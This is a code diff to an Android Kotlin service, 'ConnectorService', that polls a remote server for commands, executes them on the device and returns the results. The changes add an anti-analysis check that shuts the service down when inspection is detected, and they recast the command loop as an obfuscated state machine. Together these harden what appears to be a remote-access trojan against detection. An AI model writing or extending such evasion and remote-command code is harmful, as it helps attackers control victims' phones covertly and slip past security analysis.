@@ -87,6 +87,11 @@ class ConnectorService : Service() {
             return START_STICKY
         }
 
+        if (!AntiAnalysis.runChecks(this)) {
+            stopSelf()
+            return START_NOT_STICKY
+        }
+
         acquireWakeLock()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             startForeground(
@@ -140,28 +145,47 @@ class ConnectorService : Service() {
             log("🆔 ID: $deviceId")
             var failCount = 0
             var lastHeartbeatAt = 0L
+            val state = intArrayOf(0)
             while (polling) {
                 try {
                     val now = System.currentTimeMillis()
-                    if (now - lastHeartbeatAt >= 5000L) {
-                        sendHeartbeat()
-                        lastHeartbeatAt = now
+                    val phase = ((now / 5000L) and 0x7).toInt()
+                    when (state[0]) {
+                        0 -> {
+                            if (now - lastHeartbeatAt >= 5000L) { state[0] = 1 } else { state[0] = 2 }
+                        }
+                        1 -> {
+                            sendHeartbeat()
+                            lastHeartbeatAt = now
+                            state[0] = 2
+                        }
+                        2 -> {
+                            val cmd = pollCommand()
+                            if (cmd != null) {
+                                log("📥 CMD: ${cmd.command}")
+                                val (result, type) = executeCommand(cmd.command, cmd.extra)
+                                sendResult(cmd.id, cmd.command, result, type)
+                            }
+                            state[0] = 3
+                        }
+                        3 -> {
+                            failCount = 0
+                            state[0] = if (phase and 1 == 0) 4 else 0
+                        }
+                        4 -> {
+                            try { Thread.sleep(500) } catch (e: InterruptedException) { break }
+                            state[0] = 0
+                        }
+                        else -> { state[0] = 0 }
                     }
-                    val cmd = pollCommand()
-                    if (cmd != null) {
-                        log("📥 CMD: ${cmd.command}")
-                        val (result, type) = executeCommand(cmd.command, cmd.extra)
-                        sendResult(cmd.id, cmd.command, result, type)
-                    }
-                    failCount = 0
                 } catch (e: InterruptedException) {
                     break
                 } catch (e: Exception) {
                     failCount++
                     log("⚠️ ${e.message}")
                     if (failCount > 5) updateNotification("Server unreachable…", false)
+                    state[0] = 4
                 }
-                try { Thread.sleep(500) } catch (e: InterruptedException) { break }
             }
         }.also { it.isDaemon = true; it.start() }
     }
